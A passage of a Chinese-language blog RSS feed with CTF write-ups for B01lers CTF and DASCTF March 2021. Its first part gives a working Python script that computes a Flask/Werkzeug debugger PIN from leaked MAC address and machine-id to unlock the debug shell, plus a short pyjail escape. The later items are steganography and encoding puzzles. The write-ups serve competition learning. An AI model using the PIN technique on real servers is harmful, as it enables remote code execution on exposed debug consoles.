class="string">&#x27;web3_user&#x27;</span>,  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.5/dist-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;279275995014060&#x27;</span>,  <span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;d4e6cb65d59544f3331ea0425dc555a1&#x27;</span>  <span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"><span class="comment"># h.update(b&#x27;shittysalt&#x27;)</span></span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p><code>/sys/class/net/ens33/address</code> 读取到 MAC 地址 <code>02:42:ac:1b:00:02</code> 并将其<a href="https://www.vultr.com/resources/mac-converter/">转换</a>成十进制 <code>2485378547714</code>。<code>/proc/self/environ</code> 可以包含出 username 为 <code>loremipsum</code>。之前的报错中可以找到 flask 的运行文件的绝对路径 <code>/usr/local/lib/python3.6/dist-packages/flask/app.py</code>。</p><blockquote><h4 id="machine-id-not-found"><a href="#machine-id-not-found" class="headerlink" title="machine-id not found"></a>machine-id not found</h4><p>使用 <code>boot-id + cgroup</code> 来代替所需的 machine-id。<code>/proc/sys/kernel/random/boot_id</code> 读出一个所需的 boot-id <code>b875f129-5ae6-4ab1-90c0-ae07a6134578</code>。<code>/proc/self/cgroup</code> 可以读到 cgroup，从中选一个与 boot-id 拼接起来得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b875f129-5ae6-4ab1-90c0-ae07a6134578e8c9f0084a3b2b724e4f2a526d60bf0a62505f38649743b8522a8c005b8334ae</span><br></pre></td></tr></table></figure></blockquote><p>将上述得到的内容填进脚本中运行可得 PIN 为 <code>126-739-410</code>。直接在报错页面解锁 Debug Shell 然后读取文件即可得到 flag。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617678191018/bd83098f3c53633a473db247b076ec5cc8f3bf77.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b0ctf&#123;Fl4sK_d3buG_is_InseCure&#125;</span><br></pre></td></tr></table></figure><h3 id="Pyjailgolf-1"><a href="#Pyjailgolf-1" class="headerlink" title="Pyjailgolf 1"></a>Pyjailgolf 1</h3><p>题目给出的代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">line = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;[REDACTED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(line) &gt; <span class="number">10</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">eval</span>(line)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>此时只需要使用报错带出 flag 即可，因此构造出 <code>help(flag)</code> 即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="built_in">help</span>(flag) </span><br><span class="line">No Python documentation found <span class="keyword">for</span> <span class="string">&#x27;pctf&#123;JusT_a5k_4_h3lP!&#125;&#x27;</span>.</span><br><span class="line">Use <span class="built_in">help</span>() to get the interactive <span class="built_in">help</span> utility.</span><br><span class="line">Use <span class="built_in">help</span>(str) <span class="keyword">for</span> <span class="built_in">help</span> on the str class.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pctf&#123;JusT_a5k_4_h3lP!&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="NSNC"><a href="#NSNC" class="headerlink" title="NSNC"></a>NSNC</h3><p>题目附件是一张图，仔细观察可以发现有分开的两半二维码，将其修正一下。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617544624997/be5f53c326a1ed3cb6d9946b1156cc3269edc882.png@300w"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617544675500/6a73bf006f5a53ad8c2096ab97716d215ce6850e.png@200w" alt="image-20210404215755317"></p><p>扫描二维码可以得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MJRXIZT3NZPWKZTGL52GKZLTL5RWC3TUL5RDGX3XGBZG4X3MNFVTGX3SMU2GYX3UGMZXG7I&#x3D;</span><br></pre></td></tr></table></figure><p>Base32 解码一次可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bctf&#123;n_eff_tees_cant_b3_w0rn_lik3_re4l_t33s&#125;</span><br></pre></td></tr></table></figure><h3 id="Elfcraft"><a href="#Elfcraft" class="headerlink" title="Elfcraft"></a>Elfcraft</h3><p>附件给出的是一堆 mcfunction 文件，将其使用指令拼接起来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> *.mcfunction &gt;&gt; combination.mcfunction</span><br></pre></td></tr></table></figure><p>观察其数据特征可知其中包含着三维坐标且 y 轴大部分为 -1。因此将 x, z 两个轴的内容用正则稍微处理后提取出来之后写个脚本尝试构建图片。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;execute as @a\[scores&#x3D;&#123;search&#x3D;1&#125;\] if block ~(\d&#123;1,3&#125;) ~-1 ~(\d&#123;1,3&#125;) minecraft:white_concrete run&#x2F;</span><br><span class="line">&#x2F;scoreboard players add @a localChecks 1&#x2F;</span><br><span class="line">&#x2F;execute as @a.*\n&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL</span><br><span class="line"></span><br><span class="line">img = PIL.Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">15</span>, <span class="number">1367</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">coords = <span class="built_in">open</span>(<span class="string">&#x27;...\\combination.mcfunction&#x27;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> coordsLine <span class="keyword">in</span> coords:</span><br><span class="line">    x, y = coordsLine.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    img.putpixel((<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)), (<span class="number">16</span>,<span class="number">63</span>,<span class="number">145</span>))</span><br><span class="line">img.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到的图片上有一些 hex 数据。</p><blockquote><p>result.png 太长了不是很好放👇</p><p><a href="https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617686622772.1c48fb58d955ad4e795f53033468e1def00db69b.png">https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617686622772.1c48fb58d955ad4e795f53033468e1def00db69b.png</a></p></blockquote><p>将其中的内容转写，可得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">7F 45 4C 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">02 00 03 00 01 00 00 00 54 80 04 08 34 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 34 00 20 00 01 00 00 00</span><br><span class="line">00 00 00 00 01 00 00 00 00 00 00 00 00 80 04 08</span><br><span class="line">00 80 04 08 E4 00 00 00 E4 00 00 00 05 00 00 00</span><br><span class="line">00 10 00 00 C7 04 24 00 00 00 00 C7 44 24 FC 00</span><br><span class="line">00 00 00 C7 44 24 F8 00 00 00 00 C7 04 24 00 00</span><br><span class="line">00 00 BA 01 00 00 00 89 E1 BB 00 00 00 00 B8 03</span><br><span class="line">00 00 00 CD B0 0F B6 54 24 FC 0F B6 8A CB 80 04</span><br><span class="line">08 0F B6 14 24 31 D1 89 4C 24 F8 BA 01 00 00 00</span><br><span class="line">89 E1 83 E9 08 BB 01 00 00 00 B8 04 00 00 00 CD</span><br><span class="line">80 8B 4C 24 FC 41 89 4C 24 FC 83 F9 19 7C C6 BB</span><br><span class="line">00 00 00 00 B8 01 00 00 00 CD B0 00 01 16 04 19</span><br><span class="line">0F 53 0C 51 01 10 03 56 04 16 3D 27 2E 24 01 10</span><br><span class="line">56 04 16 1F</span><br></pre></td></tr></table></figure><p>很容易得知这是个 ELF 文件，此时再使用 IDA 打开这个文件。可以看到其反编译代码中有如下几句。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v5 = (<span class="keyword">unsigned</span> __int8)retaddr ^ *((<span class="keyword">unsigned</span> __int8 *)&amp;loc_80480CB + (<span class="keyword">unsigned</span> __int8)v6);</span><br><span class="line">  v1 = sys_write(<span class="number">1</span>, &amp;v5, <span class="number">1u</span>);</span><br><span class="line">  v3 = v6 + <span class="number">1</span>;</span><br><span class="line">  v6 = v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以推测使用了亦或的方法。因为数据在 <code>loc_80480CB</code> 的位置，因此将此处及其后面的内容提取出来，做亦或操作。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617687947254/eb44c22f6a137a8d0b9834285349510a24c442e7.png"></p><p>因为 flag 以 b 开头，且数据第一位为 <code>00</code>，因此尝试将提取出来的内容亦或字符 b。此时可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bctf&#123;m1n3cra4ft_ELFcr4ft&#125;</span><br></pre></td></tr></table></figure><h3 id="Bars-Windchests-Vocals"><a href="#Bars-Windchests-Vocals" class="headerlink" title="Bars, Windchests, Vocals"></a>Bars, Windchests, Vocals</h3><blockquote><p>Hint! The problem gives you an actual flag, it is not just a long number.<br>Hint! The long number you get <em>is</em> the flag (in a form that computers love). It is in bctf{…} format, all bells and whistles are included in it.</p></blockquote><p>附件给出的是一个包含很多乐谱的 PDF 文件，在其最后一页可以发现如下内容。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617870522255/5f6a875934623950158379f8b6d6daa577e1a4f7.png"></p><p>搜索巴赫的作品可以发现一个 BWV 编号，类似如下内容。（这里作品编号太多了，参考了大佬的 <a href="https://github.com/franfrancisco9/B01lers_CTF">WriteUp</a>）</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gib dich zufrieden BWV 510</span><br><span class="line">Präludium und Fuge As-Dur BWV 862</span><br><span class="line">Befiehl du deine Wege BWV 272</span><br><span class="line">Prelude and Fugue in C major BWV 870</span><br><span class="line">Praeludium et Fuga BWV 546</span><br></pre></td></tr></table></figure><p>查找所给附件中所有作品的编号并对应罗马数字可以得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">I &#x3D; 510</span><br><span class="line">II &#x3D; 862</span><br><span class="line">III &#x3D; 272</span><br><span class="line">IV &#x3D; 870</span><br><span class="line">V &#x3D; 546</span><br><span class="line">VI &#x3D; 146</span><br><span class="line">VII &#x3D; 189</span><br><span class="line">VIII &#x3D; 563</span><br><span class="line">IX &#x3D; 354 </span><br><span class="line">X &#x3D; 996</span><br><span class="line">XI &#x3D; 765</span><br><span class="line">XII &#x3D; 565</span><br></pre></td></tr></table></figure><p>将所得的全部数字按照顺序连接起来得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">510862272870546146189563354996765565</span><br></pre></td></tr></table></figure><p>使用 <code>long_to_bytes(510862272870546146189563354996765565).decode()</code> 即可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bctf&#123;JSB&#x2F;rOcKs&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/1ff2873b.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>DASCTF 2021.March</title>
      <link>https://lemonprefect.cn/zh-CN/posts/9a222575.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/9a222575.html</guid>
      <pubDate>Sun, 04 Apr 2021 05:35:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h3 id=&quot;简单的png隐写&quot;&gt;&lt;a href=&quot;#简单的png隐写&quot; class=&quot;headerlink&quot; title=&quot;简单的png隐写&quot;&gt;&lt;/a&gt;简单的png隐写&lt;/h3&gt;&lt;h4 id=&quot;压缩包伪加密修复&quot;&gt;&lt;a href=&quot;#压缩包伪加密修复&quot; class=&quot;headerlink&quot; title=&quot;压缩包伪加密修复&quot;&gt;&lt;/a&gt;压缩包伪加密修复&lt;/h4&gt;&lt;p&gt;将压缩包中两个文件的 deFlags 都修正为 0 即可解压文件。&lt;/p&gt;
&lt;p&gt;&lt;img</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h3 id="简单的png隐写"><a href="#简单的png隐写" class="headerlink" title="简单的png隐写"></a>简单的png隐写</h3><h4 id="压缩包伪加密修复"><a href="#压缩包伪加密修复" class="headerlink" title="压缩包伪加密修复"></a>压缩包伪加密修复</h4><p>将压缩包中两个文件的 deFlags 都修正为 0 即可解压文件。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1616837996482/0c1302082b4a52b9c38782c04e5ab4b889a89571.png"></p><h4 id="文件结构修正"><a href="#文件结构修正" class="headerlink" title="文件结构修正"></a>文件结构修正</h4><p>使用 010 editor 打开 hint.png 可以发现 IDAT chunk 有一些不对劲，猜测这是两张图片的拼接。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1616838152566/c429fda28f9e9952de0d136b02c6b19da2d141d7.png"></p><p>将 IDAT chunk 分开并补全文件头可以得到下图。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1616838199878/d1c1614e32f240c960499445f5d522d9639d940e.png"></p><h4 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h4><p>使用上述密码对 flag.jpg 使用 outguess 提取内容可得如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MUY4QjA4MDg5MTgwNzg1RTAwMDM2NjZDNjE2NzJFNzQ3ODc0MDA0QkNCNDk0Q0FGMzZCMDMwMzQ0RDM1NDlCNjRDMzMzNTMzMzRCMTQ4MzVCNzQ4NEEzNTMzNDg0OTMyMzU0QjRFMzUzMTQ5MzFCNUFDRTVFMjAyMDA0NjhCMjIzRjI4MDAwMDAw</span><br></pre></td></tr></table></figure><p>使用 CyberChef 对上述信息经过 <code>From Base64 --&gt; From Hex --&gt; Gunzip</code> 可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0815e4c9f56148e78be60db56ce44d59&#125;</span><br></pre></td></tr></table></figure><h3 id="雾都孤儿"><a href="#雾都孤儿" class="headerlink" title="雾都孤儿"></a>雾都孤儿</h3><p>使用 <a href="https://www.bertnase.de/npiet/npiet-execute.php">npiet</a> 执行附件中的图片，可以得到如下结果。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1617292938118/ed37cb604bdcae59cf5b4e04d8232a395b5a6cb9.png"></p><p>打开附件的 Word 文档可以发现有一张图片，将其从 Word 文档中提取出来，使用 <code>Tetris</code> 做 key 尝试跑 outguess  并将提取出的文件整理后可以得到如下内容。</p><blockquote><p>在线 outguess <a href="https://cyber.meme.tips/joutguess/">https://cyber.meme.tips/joutguess/</a></p></blockquote><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1000000010011101010111010000001101100000001010110101010110101011011110000000100011010101000010100110111101010011011010100011011110101001101101010111111001001011011011011001101110110101001101000000010010100101111110101100010101110111101010011011011001101111000000110101101010011010000001111000000111110101011000</span><br></pre></td></tr></table></figure><p>对 Word 文档中的文字进行频数统计，得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(&#39;&#123;&#39;, 6), (&#39;A&#39;, 19), (&#39;m&#39;, 502), (&#39;o&#39;, 1620), (&#39;n&#39;, 1467), (&#39;g&#39;, 406), (&#39; &#39;, 4914), (&#39;t&#39;, 1879), (&#39;h&#39;, 1435), (&#39;e&#39;, 2795), (&#39;r&#39;, 1343), (&#39;p&#39;, 454), (&#39;u&#39;, 567), (&#39;b&#39;, 374), (&#39;l&#39;, 906), (&#39;i&#39;, 1449), (&#39;c&#39;, 507), (&#39;d&#39;, 1017), (&#39;s&#39;, 1254), (&#39;a&#39;, 1806), (&#39;w&#39;, 560), (&#39;,&#39;, 444), (&#39;f&#39;, 457), (&#39;y&#39;, 407), (&#39;I&#39;, 59), (&#39;:&#39;, 15), (&#39;k&#39;, 159), (&#39;;&#39;, 82), (&#39;q&#39;, 26), (&#39;v&#39;, 253), (&#39;x&#39;, 41), (&#39;.&#39;, 254), (&#39;\n&#39;, 190), (&#39;F&#39;, 5), (&#39;&#125;&#39;, 8), (&#39;O&#39;, 51), (&#39;T&#39;, 63), (&#39;-&#39;, 84), (&#39;N&#39;, 13), (&#39;z&#39;, 4), (&quot;&#39;&quot;, 236), (&#39;L&#39;, 7), (&#39;!&#39;, 29), (&#39;S&#39;, 14), (&#39;M&#39;, 84), (&#39;P&#39;, 5), (&#39;Y&#39;, 12), (&#39;_&#39;, 16), (&#39;G&#39;, 3), (&#39;H&#39;, 19), (&#39;?&#39;, 17), (&#39;W&#39;, 22), (&#39;B&#39;, 44), (&#39;U&#39;, 3), (&#39;j&#39;, 7), (&#39;E&#39;, 2), (&#39;(&#39;, 9), (&#39;)&#39;, 9), (&#39;D&#39;, 6), (&#39;J&#39;, 1), (&#39;V&#39;, 1), (&#39;Z&#39;, 1), (&#39;C&#39;, 6)]</span><br></pre></td></tr></table></figure><p>将 outguess 提取出来的字符串使用上述词频进行哈夫曼解码可得 flag。</p><blockquote><p>解码脚本参考：<a href="https://lemonprefect.cn/WriteUps/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%20CTF%202021.html#:~:text=%E7%BD%91%E4%B8%8A%E6%89%BE%E4%B8%80%E6%AE%B5-,%E4%BB%A3%E7%A0%81,-%E8%A7%A3%E7%A0%81%E3%80%82">https://lemonprefect.cn/WriteUps/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%20CTF%202021.html#:~:text=%E7%BD%91%E4%B8%8A%E6%89%BE%E4%B8%80%E6%AE%B5-,%E4%BB%A3%E7%A0%81,-%E8%A7%A3%E7%A0%81%E3%80%82</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;This_Is_Hvffam_Dickens_secret_!!&#125;</span><br></pre></td></tr></table></figure><h3 id="小田的秘密"><a href="#小田的秘密" class="headerlink" title="小田的秘密"></a>小田的秘密</h3><p>使用 WireShark 分析附件给出的流量包，跟踪到 TCP 流 19 可以发现如下内容。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1617607566438/c726c350e896d5e2762a06933dd00335dc7f55ee.png"></p><p>将其提取出来，可以得到如下一段夹杂着 emoji 的字符串。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🐇 🌷 🍇🍉🐇 🌺 🌷 🍇🍉🏁 🍇🍿🔤first🔤 ➡️ 🔤c0f1b6a831c399e2🔤🔤second🔤 ➡️ 🔤9b675bd57058fd46🔤🔤third🔤➡️🔤e6ae2fec3ad71c77🔤🔤fourth🔤 ➡️ 🔤89f58062f10dd731🔤🔤fifth🔤 ➡️ 🔤6316e53c8cdd9d99🔤🍆 ➡️ dic↪️ 🐽dic 🔤first🔤❗️ ➡️ aa 🍇😀 aa❗️🍉😀 🔤+🔤❗️🍿 🔤9ac6133c88aedbd6🔤 🔤26602a67be14ea8c🔤 🔤73b5f8d8ccd5ad31🔤 🔤c42125f82a562231🔤 🍆 ➡️ 🖍️🆕sdasca🐹 sdasca❗️😀 🐽sdasca 0❗️❗️🍉🐇 🐟 🍇🔑 🆕 🍇🍉❗️ 🙋 🍇😀 🔤a109e294d1e8155be8aa4🔤❗️🍉🍉🐇 🐡 🐟 🍇🔑 🆕 🍇 ⤴️🆕❗️ 🍉✒️ ❗️ 🙋 🍇😀 🔤8adf7f2f76030877🔤❗️🍉🍉🐇 🐋 🐟 🍇🔑 🆕 🍇 ⤴️🆕❗️ 🍉✒️ ❗️ 🙋 🍇😀 🔤eba66e10fba74dbf🔤❗️🍉🍉🐇 🐠 🐟 🍇🔑 🆕 🍇 ⤴️🆕❗️ 🍉✒️❗️ 🙋 🍇😀 🔤a7749e813e9e2dba🔤❗️ 🍉🍉</span><br></pre></td></tr></table></figure><p>搜索 <code>🔤🔤third🔤➡️🔤</code> 很容易发现一些关于 Emojicode 相关的参考文章。</p><blockquote><p><a href="https://jaxenter.com/emojicode-the-programming-language-you-should-have-dreamed-of-125169.html">https://jaxenter.com/emojicode-the-programming-language-you-should-have-dreamed-of-125169.html</a></p><p>emojicode/emojicode: <a href="https://github.com/emojicode/emojicode">https://github.com/emojicode/emojicode</a></p><p>Installation: <a href="https://www.emojicode.org/docs/guides/install.html">https://www.emojicode.org/docs/guides/install.html</a></p></blockquote><p>按照其文档安装好编译器并编译上述字符串可以成功运行得到如下结果。（不是的话就多运行几次）</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c0f1b6a831c399e2</span><br><span class="line">+</span><br><span class="line">26602a67be14ea8c</span><br></pre></td></tr></table></figure><p>将其整理一下得到附件中压缩包的解压密码 <code>c0f1b6a831c399e226602a67be14ea8c</code>。解压后可以得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10?:A&#x3D;356142:GOSUB20:A&#x3D;762:GOSUB20:A&#x3D;222440:GOSUB20:END</span><br><span class="line">20A&#x3D;RND(-A)</span><br><span class="line">30A&#x3D;INT(RND(A)*22):IF A THEN ?CHR$(A+64);:GOTO30</span><br><span class="line">40?&quot; &quot;;:RETURN</span><br><span class="line"></span><br><span class="line">RUN</span><br></pre></td></tr></table></figure><p>使用 Commodore64 模拟器来运行这段代码，得到了结果 <code>NOT AN EGG</code>。</p><blockquote><p>Commodore64 Emulator: <a href="https://floooh.github.io/tiny8bit/c64-ui.html">https://floooh.github.io/tiny8bit/c64-ui.html</a></p></blockquote><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1617611975871/00d95c662d9a4d942ada6cacff6fc459af5a4ac0.png"></p><p>使用得到的结果作为密码解压 flag.rar 文件即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6bffd0d9321df3c229cdff714bb5a0b0</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/9a222575.html#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
